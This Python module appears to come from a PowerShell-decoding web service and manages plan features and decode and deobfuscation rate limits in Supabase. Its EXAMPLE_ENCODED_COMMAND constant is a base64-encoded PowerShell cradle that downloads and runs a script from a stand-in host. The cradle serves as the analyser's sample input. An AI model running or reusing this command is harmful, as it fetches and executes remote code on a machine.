"""
Service for managing user plans and features
"""
from typing import Optional, Dict, Any
from datetime import datetime, timedelta
from services.session_manager import get_supabase_client


EXAMPLE_ENCODED_COMMAND = 'powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AcwBpAHQAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA'


async def check_session_rate_limit_from_db(
    session_id: str,
    user_id: Optional[str] = None,
    limit_per_minute: int = 10
) -> Dict[str, Any]:
    """
    Check rate limit based on actual database records
    
    Args:
        session_id: Session ID to check
        user_id: Optional user ID for authenticated users
        limit_per_minute: Maximum requests per minute
        
    Returns:
        Dictionary with rate limit status
    """
    try:
        supabase = get_supabase_client()
        
        # Calculate time window (last minute)
        window_start = datetime.utcnow() - timedelta(minutes=1)
        
        # Query for analyses in the last minute
        query = supabase.table('powershell_analyses')\
            .select('id, created_at', count='exact')\
            .eq('session_id', session_id)\
            .gte('created_at', window_start.isoformat())
        
        # If user is authenticated, also count by user_id
        if user_id:
            query = query.eq('user_id', user_id)
        
        result = query.execute()
        current_count = result.count or 0
        
        
        within_limit = current_count < limit_per_minute
        
        # Calculate seconds until reset
        seconds_until_reset = None
        if not within_limit:
            # Get oldest record to calculate reset time
            oldest_query = supabase.table('powershell_analyses')\
                .select('created_at')\
                .eq('session_id', session_id)\
                .gte('created_at', window_start.isoformat())\
                .order('created_at', desc=False)\
                .limit(1)
            
            if user_id:
                oldest_query = oldest_query.eq('user_id', user_id)
            
            oldest_result = oldest_query.execute()
            
            if oldest_result.data and len(oldest_result.data) > 0:
                oldest_created_at = oldest_result.data[0]['created_at']
                oldest_time = datetime.fromisoformat(oldest_created_at.replace('Z', '+00:00'))
                reset_time = oldest_time + timedelta(minutes=1)
                current_time = datetime.now(reset_time.tzinfo)
                seconds_until_reset = max(0, int((reset_time - current_time).total_seconds()))
        
        return {
            "within_limit": within_limit,
            "current_count": current_count,
            "limit": limit_per_minute,
            "window_seconds": 60,
            "seconds_until_reset": seconds_until_reset,
            "reset_time": None
        }
        
    except Exception as e:
        print(f"[ERROR] DB Rate limit check: {type(e).__name__}")
        import traceback
        traceback.print_exc()
        # Fallback: deny access on error
        return {
            "within_limit": False,
            "current_count": 0,
            "limit": limit_per_minute,
            "window_seconds": 60,
            "seconds_until_reset": 60,
            "reset_time": None
        }


async def get_user_plan_features(user_id: str) -> Dict[str, Any]:
    """
    Get user's plan and associated features
    
    Args:
        user_id: User ID to check
        
    Returns:
        Dictionary with plan information and features
    """
    try:
        supabase = get_supabase_client()
        
        
        
        # Get user profile with plan information
        response = supabase.table('profiles')\
            .select('plan_id, subscription_status, subscription_period_end, plans(name, can_decode_commands, request_limit_per_hour, decode_limit_per_hour)')\
            .eq('id', user_id)\
            .single()\
            .execute()
        
        
        
        if not response.data:
            
            # Return default free plan features
            return {
                "plan_name": "free",
                "can_decode_commands": False,
                "request_limit_per_minute": 10,
                "decode_limit_per_minute": 5,
                "deobfuscation_limit_per_hour": 5
            }
        
        plan_data = response.data.get('plans', {})


        result = {
            "plan_name": plan_data.get('name', 'free'),
            "can_decode_commands": plan_data.get('can_decode_commands', False),
            "request_limit_per_minute": plan_data.get('request_limit_per_hour', 10),
            "decode_limit_per_minute": plan_data.get('decode_limit_per_hour', 5),
            "subscription_status": response.data.get('subscription_status'),
            "subscription_period_end": response.data.get('subscription_period_end'),
            "deobfuscation_limit_per_hour": plan_data.get('deobfuscation_limit_per_hour', 5)
        }
        
       
        
        return result
        
    except Exception as e:
        
        # Log only error type, not full details
        import traceback
        traceback.print_exc()
        # Return free plan as fallback
        return {
            "plan_name": "free",
            "can_decode_commands": False,
            "request_limit_per_minute": 10,
            "decode_limit_per_minute": 5
        }


async def can_user_decode_commands(user_id: Optional[str], session_id: Optional[str] = None, command: Optional[str] = None) -> dict:
    """
    Check if user has permission to decode commands
    
    Args:
        user_id: User ID to check (None for anonymous)
        session_id: Session ID for anonymous users
        command: Optional command to check if it's the example (won't count towards quota)
        
    Returns:
        Dictionary with decode permission and usage details
    """
    
   
    
    if command and command.strip() == EXAMPLE_ENCODED_COMMAND.strip():
        return {
            "can_decode": True,
            "current_usage": 0,
            "limit": None,
            "remaining": None,
            "seconds_until_reset": None,
            "is_example": True
        }
    if user_id:
        plan_features = await get_user_plan_features(user_id)
        plan_name = plan_features.get("plan_name", "free")
        can_decode_unlimited_flag = plan_features.get("can_decode_commands", False)
        decode_limit = plan_features.get("decode_limit_per_minute", 5)
    else:
        # For anonymous users, check the 'guest' plan configuration from DB
        plan_name = "guest"
        guest_plan = await get_plan_by_name("guest")
        if guest_plan:
            can_decode_unlimited_flag = guest_plan.get("can_decode_commands", False)
            decode_limit = guest_plan.get("decode_limit_per_hour", 5)  # DB column still has old name
            
        else:
            can_decode_unlimited_flag = False
            decode_limit = 5
           
    
   
    is_unlimited = decode_limit is None
    
   
    if is_unlimited or (plan_name in ["premium", "enterprise"] and decode_limit is None):
        return {
            "can_decode": True,
            "current_usage": 0,
            "limit": None,
            "remaining": None,
            "seconds_until_reset": None
        }
    
   
    limit = decode_limit if decode_limit is not None else 5
    

   
    from datetime import datetime, timedelta

    window_start = datetime.utcnow() - timedelta(minutes=1)
   
    supabase = get_supabase_client()

   
    query = supabase.table('powershell_analyses')\
        .select('id, created_at, has_decoded_content, is_cache, session_id, user_id', count='exact')\
        .gte('created_at', window_start.isoformat())\
        .eq('has_decoded_content', True)

    if user_id:
        query = query.eq('user_id', user_id)
        target_id = f"user:{user_id}"
        
    elif session_id:
        # For anonymous users, just match session_id (don't require user_id to be NULL)
        query = query.eq('session_id', session_id)
        target_id = f"session:{session_id}"
       
    else:
        
        return {
            "can_decode": False,
            "current_usage": 0,
            "limit": limit,
            "remaining": 0,
            "seconds_until_reset": 0
        }

    result = query.execute()
    current_usage = result.count or 0

    # Debug: Log what we found
    if result.data:
       
        for r in result.data[:5]:  # Log first 5 records
            print(f"  - id={r.get('id')}, has_decoded={r.get('has_decoded_content')}, is_cache={r.get('is_cache')}, session={str(r.get('session_id', 'N/A'))[:8] if r.get('session_id') else 'N/A'}..., created={r.get('created_at')}")
    else:
        print(f"[DECODE_CHECK] No records found with has_decoded_content=True")

    can_decode = current_usage < limit
    
   
    seconds_until_reset = None
    if not can_decode:
        # Query again to get the actual records with created_at
        # Count ALL decodes (including cache hits)
        records_query = supabase.table('powershell_analyses')\
            .select('created_at')\
            .gte('created_at', window_start.isoformat())\
            .eq('has_decoded_content', True)
        
        if user_id:
            records_query = records_query.eq('user_id', user_id)
        elif session_id:
            records_query = records_query.eq('session_id', session_id)
        
        records_result = records_query.order('created_at', desc=False).limit(1).execute()
        
        if records_result.data and len(records_result.data) > 0:
            oldest_created_at = records_result.data[0]['created_at']
            oldest_time = datetime.fromisoformat(oldest_created_at.replace('Z', '+00:00'))
            reset_time = oldest_time + timedelta(minutes=1)
            current_time = datetime.now(reset_time.tzinfo)
            seconds_until_reset = max(0, int((reset_time - current_time).total_seconds()))
        else:
            # Fallback: If no records but limit reached (edge case)
            seconds_until_reset = 60
    
    
    return {
        "can_decode": can_decode,
        "current_usage": current_usage,
        "limit": limit,
        "remaining": max(0, limit - current_usage),
        "seconds_until_reset": seconds_until_reset
    }


async def can_user_deobfuscate(user_id: Optional[str], session_id: Optional[str] = None) -> dict:
    """
    Check if user has remaining deobfuscation quota (per hour).

    Returns:
        Dictionary with deobfuscation permission and usage details
    """
    # Get the limit from the user's plan
    if user_id:
        plan_features = await get_user_plan_features(user_id)
        deob_limit = plan_features.get("deobfuscation_limit_per_hour", 5)
    else:
        guest_plan = await get_plan_by_name("guest")
        if guest_plan:
            deob_limit = guest_plan.get("deobfuscation_limit_per_hour", 5)
        else:
            deob_limit = 5

    # Unlimited
    if deob_limit is None:
        return {
            "can_deobfuscate": True,
            "current_usage": 0,
            "limit": None,
            "remaining": None,
            "seconds_until_reset": None
        }

    from datetime import datetime, timedelta

    window_start = datetime.utcnow() - timedelta(hours=1)
    supabase = get_supabase_client()

    query = supabase.table('powershell_analyses')\
        .select('id, created_at', count='exact')\
        .gte('created_at', window_start.isoformat())\
        .not_.is_('deobfuscated_command', 'null')

    if user_id:
        query = query.eq('user_id', user_id)
    elif session_id:
        query = query.eq('session_id', session_id)
    else:
        return {
            "can_deobfuscate": False,
            "current_usage": 0,
            "limit": deob_limit,
            "remaining": 0,
            "seconds_until_reset": 0
        }

    result = query.execute()
    current_usage = result.count or 0
    can_deob = current_usage < deob_limit

    seconds_until_reset = None
    if not can_deob:
        records_query = supabase.table('powershell_analyses')\
            .select('created_at')\
            .gte('created_at', window_start.isoformat())\
            .not_.is_('deobfuscated_command', 'null')

        if user_id:
            records_query = records_query.eq('user_id', user_id)
        elif session_id:
            records_query = records_query.eq('session_id', session_id)

        records_result = records_query.order('created_at', desc=False).limit(1).execute()

        if records_result.data and len(records_result.data) > 0:
            oldest_created_at = records_result.data[0]['created_at']
            oldest_time = datetime.fromisoformat(oldest_created_at.replace('Z', '+00:00'))
            reset_time = oldest_time + timedelta(hours=1)
            current_time = datetime.now(reset_time.tzinfo)
            seconds_until_reset = max(0, int((reset_time - current_time).total_seconds()))
        else:
            seconds_until_reset = 3600

    return {
        "can_deobfuscate": can_deob,
        "current_usage": current_usage,
        "limit": deob_limit,
        "remaining": max(0, deob_limit - current_usage),
        "seconds_until_reset": seconds_until_reset
    }


async def get_plan_by_name(plan_name: str) -> Optional[Dict[str, Any]]:
    """
    Get plan information by name
    
    Args:
        plan_name: Name of the plan (free, premium, enterprise)
        
    Returns:
        Plan information or None
    """
    try:
        supabase = get_supabase_client()
        
        response = supabase.table('plans')\
            .select('*')\
            .eq('name', plan_name)\
            .single()\
            .execute()
        
        return response.data if response.data else None
        
    except Exception as e:
        print(f"[ERROR] Fetching plan: {type(e).__name__}")
        return None


async def get_all_plans() -> list:
    """
    Get all available plans
    
    Returns:
        List of all plans with their features
    """
    try:
        supabase = get_supabase_client()
        
        response = supabase.table('plans')\
            .select('*')\
            .order('id')\
            .execute()
        
        return response.data if response.data else []
        
    except Exception as e:
        print(f"[ERROR] Fetching plans: {type(e).__name__}")
        return []
